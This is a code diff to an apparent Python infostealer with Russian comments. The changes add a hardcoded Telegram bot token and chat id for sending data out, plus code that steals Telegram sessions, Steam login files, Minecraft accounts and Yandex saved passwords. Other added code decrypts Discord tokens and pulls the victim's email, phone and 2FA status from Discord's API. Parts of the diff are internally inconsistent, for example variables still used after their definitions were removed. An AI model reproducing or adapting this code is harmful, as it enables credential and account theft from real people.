@@ -23,9 +23,18 @@ import zipfile
 import requests
 from distutils.dir_util import copy_tree
 import tempfile
+from sys import executable
+from sqlite3 import connect as sql_connect
+from base64 import b64decode
+from urllib.request import Request, urlopen
+from zipfile import ZipFile
+from shutil import copy2
+from subprocess import Popen, PIPE
+from re import findall, match
+import vdf
 
-chat_id = ''#СЮДА CHAT ID
-bot = telebot.TeleBot('')#СЮДА ТОКЕН БОТА
+chat_id = '5767021807'#СЮДА CHAT ID
+bot = telebot.TeleBot('5715783385:AAH1-9sMZM966HPyBuoSqVYj6nCoUkLds9U')#СЮДА ТОКЕН БОТА
 
 try:
     subprocess.run(r'c:\windows\system32\cmd.exe /C taskkill /f /im chrome.exe')
@@ -46,7 +55,7 @@ cdoperagx = dis2+'/browser/Opera GX'
 os.makedirs(dis2+'/browser/Edge')
 #telegram
 ignore_patterns = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3")
-cdtg = os.path.join(dis, 'Telegram')
+cdtg = os.path.join(dis, 'Other', 'Telegram')
 
 for path in ['D:\\Telegram Desktop\\tdata',
              os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Telegram Desktop', 'tdata'),
@@ -151,31 +160,18 @@ try:
         screenshot.save(filename)
 except:
     pass
-#epicgames
-epic_games_config_path = os.path.join(os.environ['LOCALAPPDATA'], 'EpicGamesLauncher', 'Saved', 'Config')
-destination_path = os.path.join(dis2, 'Games Launcher', 'Epic Games', 'Config')
-try:
-    shutil.copytree(epic_games_config_path, destination_path)
-except:
-    pass
-#roblox
-roblox_local_storage_path = os.path.join(os.environ['LOCALAPPDATA'], 'Roblox', 'LocalStorage')
-destination_path = os.path.join(dis2, 'Games Launcher', 'Roblox', 'LocalStorage')
-
-try:
-    shutil.copytree(roblox_local_storage_path, destination_path)
-except:
-    pass
 #steam
-steam_path = os.environ['ProgramFiles'] + '\\Steam'
+if os.path.exists(os.environ.get('ProgramFiles')):
+    steam_path = os.path.join(os.environ['ProgramFiles'], 'Steam')
+if os.path.exists(os.environ.get('ProgramFiles(x86)')):
+    steam_path = os.path.join(os.environ['ProgramFiles(x86)'], 'Steam')
+loginusers_file_path = os.path.join(steam_path, 'config', 'loginusers.vdf')
 steam_config_path = steam_path + '\\config'
-steam_x86_path = os.environ['ProgramFiles(x86)'] + '\\Steam'
-steam_x86_config_path = steam_x86_path + '\\config'
-destination_path = os.path.join(dis, 'Games Launcher', 'Steam', 'config')
-destination_path2 = os.path.join(dis, 'Games Launcher', 'Steam')
+destination_path = os.path.join(dis, 'Other', 'Steam', 'config')
+loginusers_file_path = os.path.join(steam_path, 'config', 'loginusers.vdf')
 
 try:
-    files2 = [i for i in os.listdir(steam_path) if os.path.isfile(os.path.join(steam_path, i)) and 'ssfn' in i]
+    files = [i for i in os.listdir(steam_path) if os.path.isfile(os.path.join(steam_path, i)) and 'ssfn' in i]
     shutil.copytree(steam_config_path, destination_path)
     shutil.copy(os.path.join(steam_path, files2[0]), destination_path2)
     shutil.copy(os.path.join(steam_path, files2[1]), destination_path2)
@@ -183,19 +179,25 @@ except:
     pass
 
 try:
-    files3 = [i for i in os.listdir(steam_x86_path) if os.path.isfile(os.path.join(steam_x86_path, i)) and 'ssfn' in i]
-    shutil.copytree(steam_x86_config_path, destination_path)
-    shutil.copy(os.path.join(steam_x86_path, files3[0]), destination_path2)
-    shutil.copy(os.path.join(steam_x86_path, files3[1]), destination_path2)
+    with open(loginusers_file_path, 'r', encoding='utf-8') as loginusers_file:
+        loginusers_data = vdf.load(loginusers_file)
+        users = loginusers_data.get('users', {})
+        steam_info = ""
+        for steam_id, user_data in users.items():
+            persona_name = user_data.get('PersonaName')
+            account_name = user_data.get('AccountName')
+            steam_info += f'SteamID: {steam_id}\nAccountName: {account_name}\nPersonaName: {persona_name}\nProfile URL: https://steamcommunity.com/profiles/{steam_id}\n\n'
+        with open(dis2 + "/Other/steam-info.txt", 'w') as file:
+            file.write(steam_info)
 except:
     pass
 #mincraft
 file_path = r"C:\Users\\"+user+"\AppData\Roaming\.minecraft\launcher_accounts.json"
 if os.path.exists(file_path):
-    os.makedirs(dis2+'/Games Launcher/.mincraft')
+    os.makedirs(dis2+'/Other/.mincraft')
     try:
         source_folder = r"C:\Users\\"+user+"\AppData\Roaming\.minecraft"
-        destination_folder = dis2+'/Games Launcher/.mincraft'
+        destination_folder = dis2+'/Other/.mincraft'
         blacklist = ["TLauncher.exe", "KLauncher.exe", "Old-TLauncher.exe"]
         files = os.listdir(source_folder)
         for file_name in files:
@@ -213,7 +215,7 @@ try:
         return os.path.split(os.path.expanduser('~'))[-1]
 
     def writeToFile(account):
-        with open( dis+'\Games Launcher\mincraft_info.txt', 'a') as file:
+        with open( dis+'\Other\mincraft-info.txt', 'a') as file:
             if '@' in account[2]:
                 name = 'Email Address'
             else:
@@ -518,6 +520,27 @@ try:
     os.remove(r"C:/Users//"+user+"/AppData/Roaming/LoginvaultOPERA.db")
 except:
     pass
+
+try:        
+    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Passman Data'
+    shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Local\\LoginvaultYandex.db') 
+    conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Local\\LoginvaultYandex.db')
+    cursor = conn.cursor()
+
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    for r in cursor.fetchall():
+        url = r[0]
+
+        username = r[1]
+
+        alldatapass = "\nURL: " + url + "\nUserName: " + username + "\nPassword: \n"
+
+        with open(dis+'\\browser\\Yandex\\Saved_Passwords.txt', "a") as o:
+            o.write(alldatapass)
+    conn.close()
+    os.remove(r"C:/Users//"+user+"/AppData/Local/LoginvaultYandex.db")
+except:
+    pass
 #txt
 with open(dis+'\pc-info.txt', 'w', encoding='utf-8') as f:
     try:
@@ -584,47 +607,112 @@ with open(dis+'\pc-info.txt', 'w', encoding='utf-8') as f:
         pass
 #discord
 tokens = []
-local = os.getenv("localAPPDATA")
-roaming = os.getenv("APPDATA")
+cleaned = []
+
+def decrypt(buff, master_key):
+    try:
+        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+    except:
+        return "Error"
+
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+
 try:
+    already_check = []
+    checker = []
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+    chrome = local + "\\Google\\Chrome\\User Data"
     paths = {
-        "Discord": os.path.join(roaming, "Discord"),
-        "Discord Canary": os.path.join(roaming, "discordcanary"),
-        "Discord PTB": os.path.join(roaming, "discordptb"),
-        "Google Chrome": os.path.join(local, "Google", "Chrome", "User Data", "Default"),
-        "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
-        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
-        "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
-        'Lightcord': os.path.join(roaming, "Lightcord"),
-        'Opera GX': os.path.join(roaming, "Opera Software", "Opera GX Stable"),
-        'Amigo': os.path.join(local, "Amigo", "User Data"),
-        'Torch': os.path.join(local, "Torch", "User Data"),
-        'Kometa': os.path.join(local, "Kometa", "User Data"),
-        'Orbitum': os.path.join(local, "Orbitum", "User Data"),
-        'CentBrowser': os.path.join(local, "CentBrowser", "User Data"),
-        'Sputnik': os.path.join(local, "Sputnik", "Sputnik", "User Data"),
-        'Chrome SxS': os.path.join(local, "Google", "Chrome SxS", "User Data"),
-        'Epic Privacy Browser': os.path.join(local, "Epic Privacy Browser", "User Data"),
-        'Microsoft Edge': os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
-        'Uran': os.path.join(local, "uCozMedia", "Uran", "User Data", "Default"),
-        'Iridium': os.path.join(local, "Iridium", "User Data", "Default", "local Storage", "leveld"),
-        'Firefox': os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
+        'Discord': roaming + '\\discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Lightcord': roaming + '\\Lightcord',
+        'Discord PTB': roaming + '\\discordptb',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
+        'Amigo': local + '\\Amigo\\User Data',
+        'Torch': local + '\\Torch\\User Data',
+        'Kometa': local + '\\Kometa\\User Data',
+        'Orbitum': local + '\\Orbitum\\User Data',
+        'CentBrowser': local + '\\CentBrowser\\User Data',
+        '7Star': local + '\\7Star\\7Star\\User Data',
+        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
+        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
+        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
+        'Chrome': chrome + 'Default',
+        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
+        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
+        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Iridium': local + '\\Iridium\\User Data\\Default'
     }
-
     for platform, path in paths.items():
-        path = os.path.join(path, "local Storage", "leveldb")
-        if os.path.exists(path):
-            for file_name in os.listdir(path):
-                if file_name.endswith((".log", ".ldb", ".sqlite")):
-                    with open(os.path.join(path, file_name), errors="ignore") as file:
-                        for line in file:
-                            for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"]:
-                                for token in re.findall(regex, line):
-                                    if f"{token} | {platform}" not in tokens:
-                                        tokens.append(f"{token} | {platform}")
+        if not os.path.exists(path):
+            continue
+        try:
+            with open(path + f"\\Local State", "r") as file:
+                key = json.loads(file.read())['os_crypt']['encrypted_key']
+                file.close()
+        except:
+            continue
+        for file in os.listdir(path + f"\\Local Storage\\leveldb\\"):
+            if not file.endswith(".ldb") and file.endswith(".log"):
+                continue
+            else:
+                try:
+                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
+                        for x in files.readlines():
+                            x.strip()
+                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                tokens.append(values)
+                except PermissionError:
+                    continue
+        for i in tokens:
+            if i.endswith("\\"):
+                i.replace("\\", "")
+            elif i not in cleaned:
+                cleaned.append(i)
+        for token in cleaned:
+            try:
+                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
+            except IndexError == "Error":
+                continue
+            checker.append(tok)
+            for value in checker:
+                if value not in already_check:
+                    already_check.append(value)
+                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
+                    try:
+                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+                    except:
+                        continue
+                    if res.status_code == 200:
+                        res_json = res.json()
+                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+                        user_id = res_json['id']
+                        email = res_json['email']
+                        phone = res_json['phone']
+                        mfa_enabled = res_json['mfa_enabled']
+                        has_nitro = False
+                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
+                        nitro_data = res.json()
+                        has_nitro = bool(len(nitro_data) > 0)
+                        days_left = 0
+                        if has_nitro:
+                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            days_left = abs((d2 - d1).days)
+                        now = datetime.now()
+                        saat = now.strftime("%H:%M:%S")
 
-    with open(dis2 + "/discord-token.txt", "w") as f:
-        f.write("\n".join(tokens))
+                        embed = f"""{user_name}: {saat}\nEmail: {email}\nТелефон: {phone}\n2FA: {mfa_enabled}\nNitro: {has_nitro}\nИстекает: {days_left if days_left else "None"} day(s)\nToken: {tok}\n""" 
+                        with open(dis2 + "/Other/discord-token.txt", 'w') as file:
+                            file.write(embed)
+                else:
+                    continue
 except:
     pass
 #metamask
@@ -651,6 +739,7 @@ except:
     pass
 #send
 browsers = ['Amigo', 'Torch', 'Kometa', 'Orbitum', 'Cent-browser', '7star', 'Sputnik', 'Vivaldi', 'Chrome-sxs', 'Epic-privacy-browser', 'Uran', 'Yandex', 'Brave', 'Iridium', 'Opera', 'Opera GX', 'Firefox', 'Edge', 'Chrome']
+browser = ['Amigo', 'Torch', 'Kometa', 'Orbitum', 'Cent-browser', '7star', 'Sputnik', 'Vivaldi', 'Chrome-sxs', 'Epic-privacy-browser', 'Uran', 'Brave', 'Iridium', 'Opera', 'Opera GX', 'Firefox', 'Edge', 'Chrome']
 word = 'Password'
 def count_words_in_file(filename):
     with open(filename, 'r') as file:
@@ -658,7 +747,7 @@ def count_words_in_file(filename):
         count = text.count(word)
     return count
 total_count = 0
-for br in browsers:
+for br in browser:
     path = os.path.join(r"C:\Program Filеs\browser\\"+br+"\Saved_Passwords.txt")
     if os.path.exists(path):
         count = count_words_in_file(path)
